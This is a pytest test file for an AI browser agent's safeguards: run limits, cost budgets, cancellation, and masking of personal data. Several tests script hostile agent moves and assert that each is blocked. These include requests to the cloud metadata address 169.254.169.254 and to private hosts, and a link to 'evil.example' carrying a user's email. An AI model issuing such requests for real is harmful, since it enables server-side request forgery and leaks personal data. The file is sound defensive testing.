from decimal import Decimal

import pytest
from celery.exceptions import SoftTimeLimitExceeded

from apps.browser_agent import services
from apps.browser_agent.agent import Limits, playwright_opener, run_task
from apps.browser_agent.domain_policy import check_navigation
from apps.browser_agent.models import BrowserStep, BrowserTask
from apps.browser_agent.tests.fakes import FakeBrowser, ScriptedProvider, reply
from apps.integrations.ai.agent_provider import AgentAiUnavailable
from apps.integrations.browser.playwright_browser import BrowserError

pytestmark = pytest.mark.django_db

LIMITS = Limits(
    max_steps=10,
    max_seconds=600,
    max_input_tokens=100_000,
    max_pages=10,
    max_strikes=3,
    max_page_chars=12_000,
    max_cost_usd=Decimal("1.00"),
)


def limits(**changes):
    return Limits(**{**LIMITS.__dict__, **changes})


def run(teacher, replies, *, goal="Find hours", start_url="", browser=None, **kwargs):
    task = services.create_task(teacher.school, user=teacher.user, goal=goal, start_url=start_url)
    provider = kwargs.pop("provider", None) or ScriptedProvider(replies)
    browser = browser or FakeBrowser()
    run_task(
        task,
        open_browser=browser,
        next_action=provider,
        limits=kwargs.pop("limits", LIMITS),
        **kwargs,
    )
    task.refresh_from_db()
    return task, provider, browser


def test_a_task_runs_to_done_and_records_each_step(sara):
    task, provider, browser = run(
        sara,
        [reply("goto", url="https://example.com/hours"), reply("done", text="9am to 5pm")],
    )

    assert task.status == BrowserTask.Status.DONE
    assert task.answer == "9am to 5pm"
    assert task.steps_taken == 2
    assert task.input_tokens == 200
    assert task.output_tokens == 20
    assert task.cost_usd > 0
    assert task.started_at and task.finished_at
    steps = list(task.steps.values_list("number", "action", "domain", "verdict"))
    assert steps == [(1, "goto", "example.com", "ok"), (2, "done", "example.com", "ok")]
    assert browser.visited == ["https://example.com/hours"]
    assert browser.closed


def test_the_ai_sees_placeholders_and_the_browser_gets_real_values(sara):
    raw = {
        "url": "https://example.com/contact",
        "title": "Contact",
        "elements": [{"ref": "e1", "role": "textbox", "name": "Phone", "type": "tel"}],
        "text": ["Questions? Write to principal@school.example or call 0559876543"],
    }
    task, provider, browser = run(
        sara,
        [reply("type", ref="e1", text="{PHONE_1}"), reply("done", text="Sent to {EMAIL_1}")],
        goal="Fill the contact form with my phone 0501234567",
        start_url="https://example.com/contact",
        browser=FakeBrowser(raw=raw),
    )

    sent = provider.everything_sent()
    for secret in ("0501234567", "0559876543", "principal@school.example", sara.user.email):
        assert secret not in sent
    assert "{PHONE_1}" in sent
    assert browser.typed == [("e1", "0501234567")]
    assert task.answer == "Sent to principal@school.example"


def test_private_addresses_are_blocked_and_end_the_task_after_three_strikes(sara):
    metadata = reply("goto", url="http://169.254.169.254/latest/meta-data/")
    task, provider, browser = run(sara, [metadata, metadata, metadata])

    assert task.status == BrowserTask.Status.FAILED
    assert task.failure_reason == "too_many_strikes"
    assert browser.visited == []
    assert set(task.steps.values_list("verdict", "note")) == {("blocked", "private_address")}


def test_a_public_name_pointing_inside_is_blocked(sara):
    task, _, browser = run(
        sara, [reply("goto", url="https://inside.test/"), reply("done", text="ok")]
    )

    assert browser.visited == []
    assert task.steps.get(number=1).note == "private_address"


def test_personal_data_can_not_be_sent_out_in_a_link(sara):
    task, _, browser = run(
        sara,
        [reply("goto", url="https://evil.example/?q={EMAIL_1}"), reply("done", text="x")],
        goal="My email is sara.other@example.com, find a course",
    )

    assert browser.visited == []
    assert task.steps.get(number=1).note == "personal_data_in_url"


def test_landing_on_a_private_address_after_a_click_is_blocked(sara):
    task, _, browser = run(
        sara,
        [reply("click", ref="e1"), reply("done", text="x")],
        start_url="https://example.com/",
        browser=FakeBrowser(click_to="http://10.0.0.8/admin"),
    )

    step = task.steps.get(number=1)
    assert (step.verdict, step.note) == ("blocked", "landed_on_private_address")
    assert browser.url == "about:blank"


def test_a_blocked_start_url_fails_before_any_ai_call(sara):
    task, provider, browser = run(sara, [], start_url="http://localhost:8000/")

    assert task.status == BrowserTask.Status.FAILED
    assert task.failure_reason == "start_url_internal_name"
    assert provider.calls == []
    assert browser.closed


def test_the_step_limit_ends_the_task_with_its_notes(sara):
    limits = Limits(**{**LIMITS.__dict__, "max_steps": 3})
    task, _, _ = run(
        sara,
        [reply("extract", text="Opens at 9"), reply("scroll", direction="down")],
        limits=limits,
    )

    assert task.status == BrowserTask.Status.LIMIT_REACHED
    assert task.failure_reason == "max_steps"
    assert task.steps_taken == 3
    assert task.answer == "Opens at 9"


def test_the_time_limit_ends_the_task(sara):
    ticks = iter(range(0, 100_000, 100))
    limits = Limits(**{**LIMITS.__dict__, "max_seconds": 450})
    task, _, _ = run(sara, [], limits=limits, clock=lambda: next(ticks))

    assert task.status == BrowserTask.Status.LIMIT_REACHED
    assert task.failure_reason == "max_seconds"


def test_the_token_limit_ends_the_task(sara):
    limits = Limits(**{**LIMITS.__dict__, "max_input_tokens": 250})
    task, _, _ = run(sara, [], limits=limits)

    assert task.status == BrowserTask.Status.LIMIT_REACHED
    assert task.failure_reason == "max_tokens"
    assert task.steps_taken == 3


def test_invalid_replies_count_as_strikes(sara):
    bad = {"action": "run_javascript"}
    task, _, _ = run(sara, [bad, bad, bad])

    assert task.status == BrowserTask.Status.FAILED
    assert task.failure_reason == "too_many_strikes"
    assert set(task.steps.values_list("verdict", flat=True)) == {"invalid"}


def test_a_missing_element_is_reported_and_the_task_goes_on(sara):
    task, provider, _ = run(
        sara,
        [reply("click", ref="e404"), reply("done", text="found it")],
        start_url="https://example.com/",
    )

    assert task.status == BrowserTask.Status.DONE
    assert task.steps.get(number=1).note == "element_not_found"
    assert "1. click e404 -> failed (element_not_found)" in provider.calls[1]["history"]


def test_a_provider_failure_ends_the_task_and_closes_the_browser(sara):
    def unavailable(**kwargs):
        raise AgentAiUnavailable("down")

    task, _, browser = run(sara, [], provider=unavailable)

    assert task.status == BrowserTask.Status.FAILED
    assert task.failure_reason == "llm_error"
    assert browser.closed


def test_a_browser_that_will_not_start_fails_the_task(sara):
    class Broken(FakeBrowser):
        def __enter__(self):
            raise BrowserError("launch_failed")

    task, _, _ = run(sara, [], browser=Broken())

    assert task.status == BrowserTask.Status.FAILED
    assert task.failure_reason == "browser_launch_failed"


def test_steps_keep_no_page_content_or_typed_values(sara):
    run(
        sara,
        [reply("type", ref="e1", text="{PHONE_1}"), reply("done", text="ok")],
        goal="Use my phone 0501234567",
        start_url="https://example.com/",
    )

    for step in BrowserStep.objects.all():
        stored = f"{step.action} {step.domain} {step.note}"
        assert "0501234567" not in stored
        assert "Welcome" not in stored


# ---------------------------------------------------------------- cost and budget


def test_the_per_task_cost_ceiling_stops_the_task(sara):
    # Each step costs 100 x 0.15 + 10 x 0.60 = 21 micro-dollars.
    task, provider, _ = run(sara, [], limits=limits(max_cost_usd=Decimal("0.00004")))

    assert task.status == BrowserTask.Status.LIMIT_REACHED
    assert task.failure_reason == "max_cost"
    assert task.steps_taken == 2
    assert len(provider.calls) == 2
    assert task.cost_usd == Decimal("0.000042")


def test_the_monthly_budget_stops_a_running_task(sara, settings):
    settings.BROWSER_AGENT_MONTHLY_BUDGET_USD = Decimal("0.00003")
    task, provider, _ = run(sara, [])

    assert task.status == BrowserTask.Status.LIMIT_REACHED
    assert task.failure_reason == "monthly_budget"
    assert len(provider.calls) == 2


def test_cost_is_stored_per_task_with_user_model_and_tokens(sara):
    task, _, _ = run(sara, [reply("done", text="ok")])

    assert (task.created_by, task.model) == (sara.user, "gpt-4o-mini")
    assert (task.input_tokens, task.output_tokens) == (100, 10)
    assert isinstance(task.cost_usd, Decimal)
    assert task.cost_usd == Decimal("0.000021")


# ---------------------------------------------------------------- domains


def test_a_blocked_domain_is_refused_whatever_the_case_or_subdomain(sara):
    task, _, browser = run(
        sara,
        [
            reply("goto", url="https://WWW.PayPal.com./checkout"),
            reply("goto", url="https://pay.paypal.com/"),
            reply("done", text="x"),
        ],
    )

    assert browser.visited == []
    notes = list(task.steps.filter(verdict="blocked").values_list("note", flat=True))
    assert notes == ["blocked_domain", "blocked_domain"]


def test_a_redirect_to_a_blocked_domain_is_refused_and_counted(sara):
    task, _, browser = run(
        sara,
        [reply("click", ref="e1"), reply("done", text="x")],
        start_url="https://example.com/",
        browser=FakeBrowser(click_to="https://checkout.paypal.com/pay"),
    )

    step = task.steps.get(number=1)
    assert (step.verdict, step.note) == ("blocked", "landed_on_blocked_domain")
    assert browser.url == "about:blank"


def test_three_blocked_domains_end_the_task(sara):
    paypal = reply("goto", url="https://paypal.com/")
    task, _, _ = run(sara, [paypal, paypal, paypal])

    assert task.status == BrowserTask.Status.FAILED
    assert task.failure_reason == "too_many_strikes"


def test_a_blocked_start_page_fails_the_task(sara):
    task, provider, _ = run(sara, [], start_url="https://www.absher.sa/login")

    assert task.failure_reason == "start_url_blocked_domain"
    assert provider.calls == []


def test_a_similar_looking_domain_is_not_blocked(sara):
    _, _, browser = run(
        sara, [reply("goto", url="https://notpaypal.com/"), reply("done", text="x")]
    )

    assert browser.visited == ["https://notpaypal.com/"]


def test_an_allow_list_limits_the_agent_to_its_domains(sara, settings):
    settings.BROWSER_AGENT_ALLOWED_DOMAINS = ["example.com"]
    task, _, browser = run(
        sara,
        [
            reply("goto", url="https://other.org/"),
            reply("goto", url="https://docs.example.com/"),
            reply("done", text="x"),
        ],
    )

    assert task.steps.get(number=1).note == "domain_not_allowed"
    assert browser.visited == ["https://docs.example.com/"]


def test_the_real_browser_checks_every_request_with_the_domain_rules():
    browser = playwright_opener()()
    assert browser._check_url is check_navigation


# ---------------------------------------------------------------- lifecycle


def test_a_finished_task_is_never_run_again(sara):
    task = services.create_task(sara.school, user=sara.user, goal="Find hours")
    services.finish_task(task, status=BrowserTask.Status.DONE, answer="first")
    provider = ScriptedProvider([reply("done", text="second")])

    run_task(task, open_browser=FakeBrowser(), next_action=provider, limits=LIMITS)

    task.refresh_from_db()
    assert task.answer == "first"
    assert provider.calls == []


def test_cancelling_stops_a_running_task_before_its_next_step(sara):
    task = services.create_task(sara.school, user=sara.user, goal="Find hours")
    replies = iter([reply("scroll", direction="down"), reply("done", text="never")])

    def cancel_after_first_step(**kwargs):
        if not hasattr(cancel_after_first_step, "called"):
            cancel_after_first_step.called = True
            services.cancel_task(task)
        return ScriptedProvider([next(replies)])(**kwargs)

    run_task(task, open_browser=FakeBrowser(), next_action=cancel_after_first_step, limits=LIMITS)

    task.refresh_from_db()
    assert task.status == BrowserTask.Status.CANCELLED
    assert task.failure_reason == "cancelled_by_user"
    assert task.steps_taken == 1


class FlakyProvider(ScriptedProvider):
    """Raises the given errors first, then hands back the replies."""

    def __init__(self, errors, replies=()):
        super().__init__(replies)
        self.errors = list(errors)

    def __call__(self, **kwargs):
        if self.errors:
            self.calls.append(kwargs)
            raise self.errors.pop(0)
        return super().__call__(**kwargs)


def unusable(code="bad_json", tokens=(500, 50)):
    return AgentAiUnavailable(
        code=code, input_tokens=tokens[0], output_tokens=tokens[1], model="gpt-4o-mini"
    )


def test_an_unusable_reply_is_charged_counted_as_a_strike_and_the_task_goes_on(sara):
    provider = FlakyProvider([unusable("bad_json")], [reply("done", text="ok")])
    task, _, _ = run(sara, [], provider=provider)

    assert task.status == BrowserTask.Status.DONE
    step = task.steps.get(number=1)
    assert (step.action, step.verdict, step.note) == ("ai_error", "invalid", "bad_json")
    assert (step.input_tokens, step.output_tokens) == (500, 50)
    # 500 x 0.15 + 50 x 0.60 = 105 micro-dollars, plus the good step's 21.
    assert task.cost_usd == Decimal("0.000126")
    assert "1. unusable reply (bad_json)" in provider.calls[1]["history"]


def test_three_unusable_replies_fail_the_task_with_a_clear_reason(sara):
    cut = [unusable("reply_cut_off", (1000, 1600)) for _ in range(3)]
    task, _, _ = run(sara, [], provider=FlakyProvider(cut))

    assert task.status == BrowserTask.Status.FAILED
    assert task.failure_reason == "reply_cut_off"
    assert task.input_tokens == 3000
    assert task.output_tokens == 4800


def test_tokens_of_failed_calls_count_toward_the_cost_ceiling(sara):
    # Each failed call costs 1000 x 0.15 + 1000 x 0.60 = 750 micro-dollars.
    errors = [unusable("not_an_object", (1000, 1000)) for _ in range(2)]
    task, provider, _ = run(
        sara, [], provider=FlakyProvider(errors), limits=limits(max_cost_usd=Decimal("0.001"))
    )

    assert task.status == BrowserTask.Status.LIMIT_REACHED
    assert task.failure_reason == "max_cost"
    assert len(provider.calls) == 2


def test_tokens_of_failed_calls_count_toward_the_monthly_budget(sara, settings):
    settings.BROWSER_AGENT_MONTHLY_BUDGET_USD = Decimal("0.0001")
    task, _, _ = run(sara, [], provider=FlakyProvider([unusable("bad_json", (1000, 0))]))

    assert task.failure_reason == "monthly_budget"


def test_a_provider_outage_fails_the_task_at_once(sara):
    outage = AgentAiUnavailable(code="provider_error")
    task, provider, _ = run(sara, [], provider=FlakyProvider([outage]))

    assert (task.status, task.failure_reason) == (BrowserTask.Status.FAILED, "provider_error")
    assert task.steps.count() == 0
    assert len(provider.calls) == 1


def test_no_ai_call_starts_without_time_for_its_worst_case(sara):
    from apps.browser_agent.agent import TIME_RESERVE_SECONDS

    ticks = iter(range(0, 100_000, 20))
    provider = ScriptedProvider([])
    task, _, _ = run(
        sara, [], provider=provider, limits=limits(max_seconds=200), clock=lambda: next(ticks)
    )

    assert task.failure_reason == "max_seconds"
    assert TIME_RESERVE_SECONDS == 100
    assert provider.calls
    assert all(call["time_left"] >= TIME_RESERVE_SECONDS for call in provider.calls)


def test_the_celery_soft_time_limit_closes_the_browser_and_fails_the_task(sara):
    def too_slow(**kwargs):
        raise SoftTimeLimitExceeded()

    task, _, browser = run(sara, [], provider=too_slow)

    assert task.status == BrowserTask.Status.FAILED
    assert task.failure_reason == "time_limit"
    assert browser.closed
